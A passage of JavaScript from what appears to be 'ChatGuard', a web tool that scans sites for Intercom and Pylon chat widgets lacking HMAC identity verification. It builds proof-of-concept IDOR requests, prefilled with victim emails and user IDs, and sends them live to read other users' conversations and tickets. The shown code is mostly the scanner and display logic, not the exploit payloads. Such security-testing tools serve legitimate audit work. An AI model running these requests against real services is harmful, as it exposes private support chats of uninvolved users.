            <button class="btn btn-sm" onclick="Inspector.openFinding('${f.id.toLowerCase()}')">Open in Inspector &#8599;</button>
          </div>
        </div>
      </div>
    `).join('');
  }

  async function run() {
    let url = document.getElementById('targetUrl')?.value?.trim();
    if (!url) { cgAlert('Please enter a target URL.', 'Missing URL'); return; }
    // Auto-prefix: accept bare domains like "userway.org" or "//userway.org"
    if (!/^https?:\/\//i.test(url)) {
      url = 'https://' + url.replace(/^\/\//, '');
      const inp = document.getElementById('targetUrl');
      if (inp) inp.value = url;   // show the fixed URL in the input
    }

    clearScan();
    setScanningState(true);
    log(`Deep scan → ${url}`, 'info');
    setProgress(5);

    // Streaming log callback — steps are pushed here in real-time
    let stepCount = 0;
    const onStep = (step) => {
      stepCount++;
      log(step.msg, step.ok ? 'ok' : 'warn');
      setProgress(Math.min(5 + stepCount * 7, 88));
    };

    log('Phase 1 — fetching HTML via proxy...', 'info');
    const result = await deepScan(url, onStep);

    setProgress(90);

    // Vendor fallback from URL
    if (!result.vendor) {
      const lower = url.toLowerCase();
      if (lower.includes('intercom')) result.vendor = 'Intercom';
      else if (lower.includes('pylon')) result.vendor = 'Pylon';
      if (result.vendor) log(`Vendor inferred from URL: ${result.vendor}`, 'warn');
    }

    // Build findings
    log('Evaluating IDOR attack surface...', 'info');
    const s = Storage.getSettings();
    const findings = buildFindings(result.vendor, result.appId, result.hasHmac, s);

    findings.forEach(f => {
      if (f._noWidget) return; // skip sentinel
      log(`[${f.id}] VULNERABLE — ${f.title} (CVSS ${f.cvss})`, 'vuln');
    });
    const isNoWidget = findings.length === 1 && findings[0]._noWidget;
    const realFindings = isNoWidget ? [] : findings;
    if (!isNoWidget && !realFindings.length && result.vendor) log('No misconfigurations detected.', 'ok');
    if (isNoWidget) log('No Intercom/Pylon widget detected — target is out of scope.', 'warn');

    renderFindings(findings, result.appId, result.hasHmac, result.fetchSuccess, result.appIdSource, result.confidence, result.securityStatus);

    currentScan = {
      url, vendor: result.vendor,
      findings: realFindings, appId: result.appId,
      hasHmac: result.hasHmac,
      securityStatus: result.securityStatus,
      securityEvidence: result.securityEvidence,
      userIdType: result.userIdType,
      confidence: result.confidence,
      appIdSource: result.appIdSource,
    };

    autoPopulateInspector(result);
    setProgress(100);
    const doneMsg = isNoWidget ? 'No widget detected — out of scope.' : `Done — ${realFindings.length} finding(s). Status: ${result.securityStatus}. Inspector auto-populated.`;
    log(doneMsg, isNoWidget ? 'warn' : realFindings.length ? 'vuln' : 'ok');

    const maxCvss = realFindings.reduce((m, f) => Math.max(m, parseFloat(f.cvss)), 0) || null;
    Storage.addScan({
      url, vendor: result.vendor, findings: realFindings,
      vulnerable: realFindings.length > 0,
      cvss: maxCvss, appId: result.appId,
      hasHmac: result.hasHmac,
      securityStatus: isNoWidget ? 'NO_WIDGET' : result.securityStatus,
    });
    Analytics.render();
  }

  // ── Bridge: push extracted values into Inspector inputs ──
  function autoPopulateInspector(extracted) {
    const appIdEl = document.getElementById('liveAppId');
    const userIdEl = document.getElementById('liveUserId');
    const emailEl = document.getElementById('liveEmail');

    // Only overwrite app_id if we actually found one (never overwrite manual entry with empty)
    if (appIdEl && extracted.appId) {
      appIdEl.value = extracted.appId;
      // Flash the field green briefly to show it was auto-filled
      appIdEl.style.borderColor = 'var(--secure-green)';
      appIdEl.style.backgroundColor = 'rgba(34,197,94,0.07)';
      setTimeout(() => {
        appIdEl.style.borderColor = '';
        appIdEl.style.backgroundColor = '';
      }, 2000);
    }

    // Seed user_id from detected type if not manually set
    if (userIdEl && !userIdEl.dataset.manuallyEdited) {
      userIdEl.value = extracted.userIdType === 'uuid'
        ? 'a3f5b291-7c3d-4e88-b012-9f1234567890'
        : '85070';
    }

    // Seed email from settings if not manually set
    if (emailEl && !emailEl.dataset.manuallyEdited) {
      const s = Storage.getSettings();
      emailEl.value = s.email || 'victim@example.com';
    }

    // Re-render Inspector so templates immediately reflect new app_id
    if (typeof Inspector !== 'undefined') Inspector.render();

    // Update the security status badge in the Inspector params bar
    const secBadgeEl = document.getElementById('inspectorSecBadge');
    if (secBadgeEl && extracted.securityStatus && extracted.securityStatus !== 'UNKNOWN') {
      const sl = extracted.hasHmac
        ? { text: 'SECURE: HMAC', css: 'badge-secure', icon: '🔒' }
        : { text: 'VULNERABLE: NO-HMAC', css: 'badge-vuln', icon: '⚠' };
      secBadgeEl.className = `sec-badge ${sl.css}`;
      secBadgeEl.textContent = `${sl.icon} ${sl.text}`;
      secBadgeEl.style.display = 'inline-flex';
    }
  }

  async function runDemo() {
    clearScan();
    setScanningState(true);
    log('Demo scan — loading bundled demo target...', 'info');
    setProgress(5);

    let demoHtml;
    try {
      // Fetch the local demo page directly — same-origin, no proxy needed
      const res = await fetch('demo/target.html');
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      demoHtml = await res.text();
      log(`Demo target loaded (${(demoHtml.length/1024).toFixed(1)} KB)`, 'ok');
    } catch (e) {
      log(`Could not load demo/target.html: ${e.message}. Run ChatGuard from a local server (python3 -m http.server 8080).`, 'warn');
      return;
    }

    // Build an absolute URL for logging/display. Under file:// the origin is the
    // string "null", so fall back to a clean relative reference rather than
    // emitting "null/demo/target.html".
    const origin    = window.location.origin;
    const demoUrl   = (origin && origin !== 'null')
      ? origin + '/demo/target.html'
      : 'demo/target.html';
    const demoLabel = 'demo/target.html (local)';
    const inp = document.getElementById('targetUrl');
    if (inp) inp.value = demoLabel;

    setProgress(10);
    log(`Deep scan → ${demoLabel}`, 'info');

    let stepCount = 0;
    const onStep = s => {
      stepCount++;
      log(s.msg, s.ok ? 'ok' : 'warn');
      setProgress(Math.min(10 + stepCount * 7, 88));
    };

    // Pass pre-fetched HTML directly — Phase 1 proxy is skipped
    const result = await deepScan(demoUrl, onStep, demoHtml);

    setProgress(90);
    const settings = Storage.getSettings();
    const findings = buildFindings(result.vendor, result.appId, result.hasHmac, settings);
    findings.forEach(f => { if (!f._noWidget) log(`[${f.id}] VULNERABLE — ${f.title} (CVSS ${f.cvss})`, 'vuln'); });

    const isNoWidget   = findings.length === 1 && findings[0]._noWidget;
    const realFindings = isNoWidget ? [] : findings;

    renderFindings(findings, result.appId, result.hasHmac, result.fetchSuccess,
                   result.appIdSource, result.confidence, result.securityStatus);

    currentScan = {
      url: demoLabel, vendor: result.vendor,
      findings: realFindings, appId: result.appId,
      hasHmac: result.hasHmac, securityStatus: result.securityStatus,
      securityEvidence: result.securityEvidence,
      userIdType: result.userIdType, confidence: result.confidence,
      appIdSource: result.appIdSource,
    };

    autoPopulateInspector(result);
    setProgress(100);
    log(`Demo done — ${realFindings.length} finding(s). Status: ${result.securityStatus}.`,
        realFindings.length ? 'vuln' : 'ok');

    const maxCvss = realFindings.reduce((m, f) => Math.max(m, parseFloat(f.cvss)), 0) || null;
    Storage.addScan({
      url: demoLabel, vendor: result.vendor, findings: realFindings,
      vulnerable: realFindings.length > 0, cvss: maxCvss, appId: result.appId,
      hasHmac: result.hasHmac,
      securityStatus: isNoWidget ? 'NO_WIDGET' : result.securityStatus,
    });
    Analytics.render();
  }

  function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
  function getCurrentScan() { return currentScan; }

  function copyLog() {
    const la = document.getElementById('logArea');
    const text = la ? la.innerText : '';
    navigator.clipboard.writeText(text).then(() => {
      const btn = document.getElementById('logCopyBtn');
      if (btn) { btn.textContent = '✓ COPIED'; btn.classList.add('copied'); }
      setTimeout(() => {
        if (btn) { btn.textContent = '⎘ COPY'; btn.classList.remove('copied'); }
      }, 1800);
    }).catch(() => {
      // Fallback for older browsers
      const ta = document.createElement('textarea');
      ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
      document.body.appendChild(ta); ta.select();
      document.execCommand('copy'); document.body.removeChild(ta);
    });
  }

  return { run, runDemo, clearScan, getCurrentScan, autoPopulateInspector, copyLog };
})();

window.toggleFinding = (i) => {
  const el = document.getElementById('fb-' + i);
  if (el) el.classList.toggle('open');
};

// ──────────────────────────────────────────────────
// inspector.js
// ──────────────────────────────────────────────────
// ══════════════════════════════════════════════════
// Inspector — Request/Response UI (live param inputs)
// ══════════════════════════════════════════════════
const Inspector = (() => {
  let currentVuln = 'a01';
  let currentStep = 1;
  let reqFormat = 'raw';
  let respFormat = 'pretty';

  // Read live values from the input bar — fall back to settings/defaults
  function getLiveParams() {
    const appIdEl  = document.getElementById('liveAppId');
    const userIdEl = document.getElementById('liveUserId');
    const emailEl  = document.getElementById('liveEmail');
    const issueEl  = document.getElementById('liveIssueId');
    const blocksEl = document.getElementById('liveBlocks');
    const settings = Storage.getSettings();
    const appId   = appIdEl?.value?.trim() || '';
    const userId  = userIdEl?.value?.trim() || (settings.userIdType === 'uuid' ? 'a3f5b291-7c3d-4e88-b012-9f1234567890' : '85070');
    const email   = emailEl?.value?.trim() || settings.email || 'victim@example.com';
    const issueId = issueEl?.value?.trim() || '';
    const blocks  = blocksEl?.value?.trim() || '[{"type":"paragraph","text":"ChatGuard_Test"}]';
    return { appId, userId, email, issueId, blocks };
  }

  // Fix 2+4: Live app_id input handler — auto-detects vendor from typed ID
  // and updates the badge label next to the app_id field instantly.
  function onAppIdInput(val) {
    const badge = document.getElementById('vendorBadgeLive');
    if (!badge) return;
    const v = val.trim();
    if (!v) { badge.style.display = 'none'; return; }
    // Pylon UUID: contains hyphens
    if (v.includes('-')) {
      badge.textContent = 'UsePylon';
      badge.style.display = 'inline-block';
      badge.style.background = 'rgba(188,19,254,.15)';
      badge.style.color = '#d580ff';
      badge.style.border = '1px solid rgba(188,19,254,.35)';
      // Auto-switch vuln tab to A03 if not already there
      if (currentVuln !== 'a03') {
        const chip = document.querySelector('.vuln-chip:nth-child(3)');
        setVuln('a03', chip);
      }
    } else if (/^[a-zA-Z0-9]{8,10}$/.test(v)) {
      badge.textContent = 'Intercom';
      badge.style.display = 'inline-block';
      badge.style.background = 'rgba(0,229,255,.1)';
      badge.style.color = 'var(--accent)';
      badge.style.border = '1px solid rgba(0,229,255,.3)';
    } else {
      badge.style.display = 'none';
    }
  }

  // Show/hide param fields based on which vuln is active
  function updateParamVisibility() {
    const userIdWrap = document.getElementById('liveUserIdWrap');
    const emailWrap = document.getElementById('liveEmailWrap');
    const grid = document.getElementById('inspectorParamsGrid');
    if (!userIdWrap || !emailWrap) return;
    // A01: needs app_id + user_id (no email needed)
    // A02: needs app_id + email (no user_id needed)
    // A03: needs app_id + email (Pylon app_id pre-filled)
    if (currentVuln === 'a01') {
      userIdWrap.style.display = 'block';
      emailWrap.style.display = 'none';
      // Update user_id label to reflect UUID note
      const lbl = userIdWrap.querySelector('label');
      const settings = Storage.getSettings();
      if (lbl) lbl.innerHTML = `user_id <span style="color:var(--vulnerable-red)">*</span> <span style="color:var(--text-muted);font-weight:400">(${settings.userIdType === 'uuid' ? 'UUID format' : 'numeric'})</span>`;
    } else if (currentVuln === 'a02') {
      userIdWrap.style.display = 'none';
      emailWrap.style.display = 'block';
    } else if (currentVuln === 'a03') {
      userIdWrap.style.display = 'none';
      emailWrap.style.display = 'block';
      // Pre-fill Pylon app_id if empty
      const appIdEl = document.getElementById('liveAppId');
      if (appIdEl && !appIdEl.value.trim()) {
        appIdEl.value = TemplateManager.PYLON_APP_ID;
      }
    }
  }

  // Check if app_id looks placeholder-ish, show a warning indicator
  function updateAppIdValidation() {
    const el = document.getElementById('liveAppId');
    if (!el) return;
    const v = el.value.trim();
    const isEmpty = !v;
    el.style.borderColor = isEmpty ? 'rgba(239,68,68,0.5)' : 'var(--border)';
    el.style.backgroundColor = isEmpty ? 'rgba(239,68,68,0.05)' : '';
  }

  function setVuln(id, btn) {
    currentVuln = id;
    currentStep = 1;
    document.querySelectorAll('.vuln-chip').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    const stepTabs = document.getElementById('stepTabs');
    if (stepTabs) stepTabs.style.display = id === 'a03' ? 'flex' : 'none';
    // Show Issue ID field only for Pylon (A03)
    const wii = document.getElementById('wrapIssueId');
    if (wii) wii.style.display = id === 'a03' ? 'block' : 'none';
    // Pre-fill Pylon app_id if empty and A03 selected
    if (id === 'a03') {
      const appIdEl = document.getElementById('liveAppId');
      if (appIdEl && !appIdEl.value.trim()) appIdEl.value = TemplateManager.PYLON_APP_ID || '99eb6b49-90f0-42c5-99f5-6f509ecc0e88';
    }
    if (id === 'a03') {
      document.querySelectorAll('.step-tab').forEach((b,i) => { b.classList.toggle('active', i === 0); });
    }
    const settings = Storage.getSettings();
    const isUuid = id === 'a01' && settings.userIdType === 'uuid' && settings.uuidNote;
    const note = document.getElementById('uuidNote');
    if (note) note.classList.toggle('show', isUuid);
    updateParamVisibility();
    render();
  }

  function setStep(n, btn) {
    currentStep = n;
    document.querySelectorAll('.step-tab').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    render();
  }

  function setReqFormat(fmt, btn) {
    reqFormat = fmt;
    document.querySelectorAll('.code-tabs .code-tab').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    renderReq();
  }

  function setRespFormat(fmt, btn) {
    respFormat = fmt;
    // Sync tab active state — resp tabs are inside #respPanel's parent panel header
    const respPanel = document.getElementById('respPanel');
    if (respPanel) {
      const header = respPanel.closest('.code-panel')?.querySelector('.code-tabs');
      if (header) {
        header.querySelectorAll('.code-tab').forEach(b => b.classList.remove('active'));
        if (btn) btn.classList.add('active');
      }
    }
    renderResp();
  }

  function getTemplate() {
    const t = TemplateManager.templates;
    if (currentVuln === 'a01') return t.a01;
    if (currentVuln === 'a02') return t.a02;
    if (currentVuln === 'a03') return currentStep === 1 ? t.a03_step1 : t.a03_step2;
    return t.a01;
  }

  function getResponse() {
    const r = TemplateManager.responses;
    if (currentVuln === 'a01') return r.a01;
    if (currentVuln === 'a02') return r.a02;
    if (currentVuln === 'a03') return currentStep === 1 ? r.a03_step1 : r.a03_step2;
    return r.a01;
  }

  function getResponseData() {
    const r = TemplateManager.responseData;
    if (currentVuln === 'a01') return r.a01;
    if (currentVuln === 'a02') return r.a02;
    if (currentVuln === 'a03') return currentStep === 1 ? r.a03_step1 : r.a03_step2;
    return r.a01;
  }

  // ── Chat View parsing engine ────────────────────────────────────────
  // Converts a structured Intercom / Pylon response object into a realistic
  // chat thread. EVERY rendered string is routed through escapeHtml() before
  // it touches innerHTML, so a malicious remote payload cannot self-XSS.

  function chatFmtTime(unix) {
    if (unix === null || unix === undefined || unix === '') return '';
    let n = Number(unix);
    if (!isFinite(n)) return '';
    // a01/a02 use integer unix seconds; Pylon uses float seconds. Anything
    // below 1e12 is treated as seconds and scaled to milliseconds.
    const ms = n < 1e12 ? n * 1000 : n;
    const d = new Date(ms);
    if (isNaN(d.getTime())) return '';
    return d.toLocaleString(undefined, {
      month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit'
    });
  }

  function chatInitials(name) {
    const parts = String(name || '?').trim().split(/\s+/).filter(Boolean);
    if (!parts.length) return '?';
    if (parts.length === 1) return parts[0].slice(0, 2).toUpperCase();
    return (parts[0][0] + parts[parts.length - 1][0]).toUpperCase();
  }

  // Deterministic accent for an avatar based on the name string.
  function chatAvatarHue(name) {
    let h = 0;
    const s = String(name || '');
    for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) % 360;
    return h;
  }

  // Support/agent/admin float LEFT; user/visitor float RIGHT.
  function chatIsSupport(author, isAdmin) {
    if (isAdmin === true) return true;
    const t = String(author && author.type || '').toLowerCase();
    return t === 'admin' || t === 'agent' || t === 'support' || t === 'operator';
  }

  // Clean a message body: drop any embedded HTML tags, then escape.
  function chatCleanBody(body) {
    const stripped = String(body == null ? '' : body).replace(/<[^>]+>/g, '');
    return escapeHtml(stripped);
  }

  function chatBubble(opts) {
    const side = opts.support ? 'support' : 'visitor';
    const hue = chatAvatarHue(opts.name);
    const initials = escapeHtml(chatInitials(opts.name));
    const nameLabel = escapeHtml(opts.name || (opts.support ? 'Support' : 'Visitor'));
    const roleTag = opts.support ? ' <span class="chat-role">Support</span>' : '';
    const time = opts.time ? `<span class="chat-time">${escapeHtml(opts.time)}</span>` : '';
    const body = opts.body; // already cleaned + escaped by caller
    return `
      <div class="chat-msg chat-${side}">
        <div class="chat-avatar" style="--chat-hue:${hue}">${initials}</div>
        <div class="chat-bubble-wrap">
          <div class="chat-meta"><span class="chat-name">${nameLabel}</span>${roleTag}${time}</div>
          <div class="chat-bubble">${body}</div>
        </div>
      </div>`;
  }

  function chatSystemNote(text) {
    return `<div class="chat-system">${escapeHtml(text)}</div>`;
  }

  // Build the chat HTML from any supported response shape.
  function renderChatHtml(data, email) {
    if (!data || typeof data !== 'object') {
      return chatSystemNote('No conversation data available for Chat View.');
    }

    let header = '';
    const rows = [];

    // ── A01 — Intercom conversation_parts ─────────────────────────────
    if (Array.isArray(data.conversation_parts)) {
      header = 'Intercom Conversation';
      data.conversation_parts.forEach(part => {
        const author = part.author || {};
        const support = chatIsSupport(author, part.is_admin);
        let name = author.name || (support ? 'Support' : 'Visitor');
        // Reflect the live email value for the visitor identity.
        if (!support && email && author.email) name = author.name || email;
        rows.push(chatBubble({
          support, name,
          body: chatCleanBody(part.body),
          time: chatFmtTime(part.created_at)
        }));
      });
    }
    // ── A02 — Intercom conversations[].conversation_message.blocks ─────
    else if (Array.isArray(data.conversations)) {
      header = 'Intercom Conversations';
      data.conversations.forEach(conv => {
        const msg = conv.conversation_message || {};
        const blocks = Array.isArray(msg.blocks) ? msg.blocks : [];
        const text = blocks
          .filter(b => b && (b.type === 'paragraph' || b.text))
          .map(b => b.text).filter(Boolean).join('\n');
        rows.push(chatBubble({
          support: false,
          name: email || 'Visitor',
          body: chatCleanBody(text),
          time: chatFmtTime(msg.sent_at)
        }));
      });
    }
    // ── A03 step 2 — Pylon issue with messages[] ──────────────────────
    else if (Array.isArray(data.messages)) {
      header = data.title ? `Pylon — ${data.title}` : 'Pylon Conversation';
      data.messages.forEach(m => {
        const author = m.author || {};
        const support = chatIsSupport(author, false);
        rows.push(chatBubble({
          support,
          name: author.name || (support ? 'Support' : 'Visitor'),
          body: chatCleanBody(m.body),
          time: chatFmtTime(m.time)
        }));
      });
    }
    // ── A03 step 1 — Pylon unreads (no message bodies) ────────────────
    else if (data.data && Array.isArray(data.data.issues)) {
      header = 'Pylon — Unread Lookup';
      data.data.issues.forEach(iss => {
        rows.push(chatSystemNote(
          `Ticket #${iss.ticket_number} · issue ${iss.issue_id} · ${iss.num_unread_messages} unread`
        ));
      });
      if (!data.data.issues.length) rows.push(chatSystemNote('No issues returned.'));
    }
    // ── Fallback ──────────────────────────────────────────────────────
    else {
      return chatSystemNote('Chat View cannot parse this response shape — switch to Pretty or Raw.');
    }

    const headerHtml = header
      ? `<div class="chat-header"><span class="chat-dot"></span>${escapeHtml(header)}</div>`
      : '';
    return `<div class="chat-view">${headerHtml}<div class="chat-thread">${rows.join('')}</div></div>`;
  }

  function renderReq() {
    const panel = document.getElementById('reqPanel');
    if (!panel) return;
    const tmpl = getTemplate();
    const { appId, userId, email, issueId, blocks } = getLiveParams();
    updateAppIdValidation();
    onAppIdInput(appId);
    let content = '';
    if (reqFormat === 'raw')    content = tmpl.raw(appId, userId, email, issueId, blocks);
    else if (reqFormat === 'curl')   content = tmpl.curl(appId, userId, email, issueId, blocks);
    else                             content = tmpl.python(appId, userId, email, issueId, blocks);

    // Fix 3 (Inspector): prepend HMAC warning when Identity Verification is detected
    const scan = (typeof Engine !== 'undefined') ? Engine.getCurrentScan() : null;
    if (scan?.hasHmac) {
      const warnColor = 'color:#fcd34d'; // amber
      const warnLine = reqFormat === 'python'
        ? `<span style="${warnColor}"># ⚠ WARNING: Identity Verification detected. Request will likely fail without a valid HMAC hash.\n# Generate user_hash = HMAC-SHA256(secret_key, user_id_or_email) server-side.\n\n</span>`
        : `<span style="${warnColor}">// ⚠ WARNING: Identity Verification detected.\n// Request will likely fail without a valid user_hash (HMAC-SHA256 signature).\n\n</span>`;
      content = warnLine + content;
    }
    panel.innerHTML = content;
  }

  function renderResp() {
    const panel = document.getElementById('respPanel');
    if (!panel) return;
    const { email } = getLiveParams();

    // If a real API response is loaded (_realRespData), render that.
    // Otherwise render the simulated template, respecting respFormat toggle.
    if (Inspector._realRespData) {
      const data = Inspector._realRespData;
      if (respFormat === 'chat') {
        panel.innerHTML = renderChatHtml(data, email);
        return;
      }
      if (respFormat === 'raw') {
        const raw = typeof data === 'string' ? data : JSON.stringify(data);
        panel.innerHTML = `<span style="color:var(--text-secondary)">${raw.replace(/</g,'&lt;')}</span>`;
      } else {
        // pretty — already rendered by the send-request path via syntaxHighlight
        const pretty = typeof data === 'object' ? RequestSender.syntaxHighlight(data) : `<span style="color:var(--text-secondary)">${String(data).replace(/</g,'&lt;')}</span>`;
        panel.innerHTML = `<span style="color:var(--text-muted);font-size:.6875rem">// Real API response\n</span>` + pretty;
      }
      return;
    }

    // Chat View parses the raw response object into a rendered thread.
    if (respFormat === 'chat') {
      panel.innerHTML = renderChatHtml(getResponseData(), email);
      return;
    }

    // Simulated template response
    let html = getResponse();
    html = html.replace(/victim@example\.com/g, email || 'victim@example.com');

    if (respFormat === 'raw') {
      // Strip all HTML spans to produce a plain JSON string
      const plain = html.replace(/<[^>]+>/g, '');
      panel.innerHTML = `<span style="color:var(--text-secondary)">${plain.replace(/</g,'&lt;')}</span>`;
    } else {
      // Pretty — full syntax-highlighted template
      panel.innerHTML = html;
    }
  }

  function renderSummary() {
    const container = document.getElementById('vulnSummary');
    if (!container) return;
    const key = currentVuln === 'a03' ? 'a03' : currentVuln;
    const s = TemplateManager.summaries[key];
    if (!s) return;
    const { appId } = getLiveParams();
    const appIdDisplay = appId || '<span style="color:var(--vulnerable-red);font-style:italic">not set — enter above</span>';
    container.innerHTML = `
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:.75rem;font-size:.8125rem">
        <div>
          <div class="finding-row"><span class="finding-label">Finding ID</span><span class="finding-value" style="font-family:var(--font-mono)">${s.id}</span></div>
          <div class="finding-row"><span class="finding-label">Title</span><span class="finding-value">${s.title}</span></div>
          <div class="finding-row"><span class="finding-label">CVSS Score</span><span class="finding-value vuln">${s.cvss} ${s.severity}</span></div>
          <div class="finding-row"><span class="finding-label">CVSS Vector</span><span class="finding-value" style="font-family:var(--font-mono);font-size:.7rem;color:var(--text-muted)">${s.vuln}</span></div>
        </div>
        <div>
          <div class="finding-row"><span class="finding-label">Endpoint</span><span class="finding-value" style="font-family:var(--font-mono);font-size:.75rem">${s.endpoint}</span></div>
          <div class="finding-row"><span class="finding-label">API Host</span><span class="finding-value" style="font-family:var(--font-mono);font-size:.75rem">${s.api}</span></div>
          <div class="finding-row"><span class="finding-label">Parameter</span><span class="finding-value vuln">${s.param}</span></div>
          <div class="finding-row"><span class="finding-label">app_id used</span><span class="finding-value" style="font-family:var(--font-mono);font-size:.75rem">${appIdDisplay}</span></div>
        </div>
      </div>
      <hr class="divider">
      <div style="font-size:.8125rem">
        <span style="color:var(--text-secondary);font-weight:600;font-size:.75rem;text-transform:uppercase;letter-spacing:.05em">Recommendation</span>
        <p style="margin-top:.5rem;color:var(--text-primary);line-height:1.7">${s.rec}</p>
      </div>`;
  }

  function render() {
    renderReq();
    renderResp();
    renderSummary();
  }

  function populateFromScan(scan) {
    if (!scan) return;
    const appIdEl = document.getElementById('liveAppId');
    if (appIdEl && scan.appId) appIdEl.value = scan.appId;
    // Pre-fill email from settings
    const emailEl = document.getElementById('liveEmail');
    if (emailEl && !emailEl.value) emailEl.value = Storage.getSettings().email || 'victim@example.com';
    // Pre-fill user_id from settings
    const userIdEl = document.getElementById('liveUserId');
    if (userIdEl && !userIdEl.value) {
      const s = Storage.getSettings();
      userIdEl.value = s.userIdType === 'uuid' ? 'a3f5b291-7c3d-4e88-b012-9f1234567890' : '85070';
    }
  }

  function openFinding(vulnId) {
    showPage('inspector', document.querySelectorAll('.nav-tab')[1]);
    const chips = document.querySelectorAll('.vuln-chip');
    const map = { a01: 0, a02: 1, a03: 2 };
    setVuln(vulnId, chips[map[vulnId]]);
    populateFromScan(ScannerEngine.getCurrentScan());
    render();
  }

  function openFromScan() {
    const scan = ScannerEngine.getCurrentScan();
    showPage('inspector', document.querySelectorAll('.nav-tab')[1]);
    populateFromScan(scan);
    if (scan && scan.findings.length) {
      const chips = document.querySelectorAll('.vuln-chip');
      const map = { a01: 0, a02: 1, a03: 2 };
      const first = scan.findings[0].id.toLowerCase();
      setVuln(first, chips[map[first]]);
    } else {
      updateParamVisibility();
      render();
    }
  }

  function loadScan(id) {
    const scan = Storage.getHistory().find(s => s.id === id);
    if (!scan) return;
    showPage('inspector', document.querySelectorAll('.nav-tab')[1]);
    populateFromScan(scan);
    if (scan.findings && scan.findings.length) {
      const first = scan.findings[0].id.toLowerCase();
      const chips = document.querySelectorAll('.vuln-chip');
      const map = { a01: 0, a02: 1, a03: 2 };
      setVuln(first, chips[map[first]]);
    } else {
      updateParamVisibility();
      render();
    }
  }

  function init() {
    // Seed email + user_id from settings on first load
    const s = Storage.getSettings();
    const emailEl = document.getElementById('liveEmail');
    if (emailEl && !emailEl.value) emailEl.value = s.email || 'victim@example.com';
    const userIdEl = document.getElementById('liveUserId');
    if (userIdEl && !userIdEl.value) userIdEl.value = s.userIdType === 'uuid' ? 'a3f5b291-7c3d-4e88-b012-9f1234567890' : '85070';
    updateParamVisibility();
    render();
  }

  function resetToScanValues() {
    const scan = ScannerEngine.getCurrentScan();
    if (!scan) { cgAlert('No scan loaded — run a scan first.', 'No Scan'); return; }
    // Clear the manually-edited flags so auto-populate can overwrite
    ['liveAppId','liveUserId','liveEmail'].forEach(id => {
      const el = document.getElementById(id);
      if (el) delete el.dataset.manuallyEdited;
    });
    ScannerEngine.autoPopulateInspector({
      appId: scan.appId,
      userIdType: scan.userIdType || 'sequential',
      hasHmac: scan.hasHmac
    });
  }

  function getState() { return { vuln: currentVuln, step: currentStep }; }

  return { setVuln, setStep, setReqFormat, setRespFormat, render, openFinding, openFromScan, loadScan, init, populateFromScan, resetToScanValues, getState };
})();

// ══════════════════════════════════════════════════
// RequestSender — Real HTTP request to Intercom/Pylon
// Sends the actual PoC request and renders the live
// response in the Inspector response pane.
// ══════════════════════════════════════════════════
const RequestSender = (() => {
  let lastRealResponse = null;

  function setStatus(msg, type = 'info') {
    const el = document.getElementById('sendStatus');
    if (!el) return;
    const colors = { info: 'var(--text-muted)', ok: 'var(--secure-green)', err: 'var(--vulnerable-red)', loading: 'var(--warn-amber)' };
    el.style.color = colors[type] || colors.info;
    el.textContent = msg;
  }

  function setBadge(status, ok) {
    const el = document.getElementById('respStatusBadge');
    if (!el) return;
    el.style.display = 'inline-block';
    el.style.background = ok ? 'var(--secure-green-bg)' : 'var(--vulnerable-red-bg)';
    el.style.color = ok ? '#86efac' : '#fca5a5';
    el.style.border = `1px solid ${ok ? 'var(--secure-green-border)' : 'var(--vulnerable-red-border)'}`;
    el.textContent = status;
  }

  function syntaxHighlight(obj) {
    // SECURITY: this output is injected via innerHTML (see showRealResponse),
    // and `obj` may be an attacker-controlled remote JSON body. Escape the
    // HTML-significant characters (&, <, >) BEFORE tokenizing so no markup
    // from the response can break out into live DOM. Double-quotes are left
    // intact on purpose — the tokenizer regex below relies on them to detect
    // JSON string/key boundaries, and a bare " in text content is inert.
    const raw = typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2);
    const json = raw.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, (match) => {
      let cls = 'json-num';
      if (/^"/.test(match)) {
        cls = /:$/.test(match) ? 'json-key' : 'json-string';
      } else if (/true|false/.test(match)) {
        cls = 'json-bool';
      }
      // UUID-like strings get special colour
      if (cls === 'json-string' && /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}/.test(match)) cls = 'json-uuid';
      return `<span class="${cls}">${match}</span>`;
    });
  }

  function showRealResponse(data, status, ok) {
    lastRealResponse = data;
    setBadge(`HTTP ${status}`, ok);
    const panel = document.getElementById('respPanel');
    if (!panel) return;
    // Store on Inspector so renderResp() can re-render on format toggle
    Inspector._realRespData = data;
    let pretty;
    try {
      const parsed = typeof data === 'string' ? JSON.parse(data) : data;
      pretty = syntaxHighlight(parsed);
    } catch {
      pretty = `<span style="color:var(--text-secondary)">${String(data).replace(/</g,'&lt;')}</span>`;
    }
    panel.innerHTML = `<span style="color:var(--text-muted);font-size:.6875rem">// REAL response from API — ${new Date().toLocaleTimeString()}\n</span>` + pretty;
    document.getElementById('respPanelLabel').textContent = 'Response (LIVE)';
  }

  async function send() {
    const appId = document.getElementById('liveAppId')?.value?.trim();
    const userId = document.getElementById('liveUserId')?.value?.trim();
    const email = document.getElementById('liveEmail')?.value?.trim();

    if (!appId) {
      cgAlert('Enter an app_id first — run a scan or paste it manually in the Inspector param bar.', 'Missing app_id');
      return;
    }

    // Determine which vuln/step is active by reading Inspector state
    // We expose a getter from Inspector for this
    const { vuln, step } = Inspector.getState();
    const btn = document.getElementById('sendReqBtn');
    if (btn) { btn.disabled = true; btn.textContent = '⏳ Sending...'; }
    setStatus('Sending request...', 'loading');

    try {
      if (vuln === 'a01') {
        await sendIntercomMessages(appId, userId || '85070');
      } else if (vuln === 'a02') {
        await sendIntercomConversations(appId, email || 'victim@example.com');
      } else if (vuln === 'a03') {
        if (step === 1) await sendPylonUnreads(appId, email || 'victim@example.com');
        else await sendPylonIssue(appId, email || 'attacker@evil.com');
      }
    } catch (e) {
      setStatus(`Error: ${e.message}`, 'err');
      const panel = document.getElementById('respPanel');
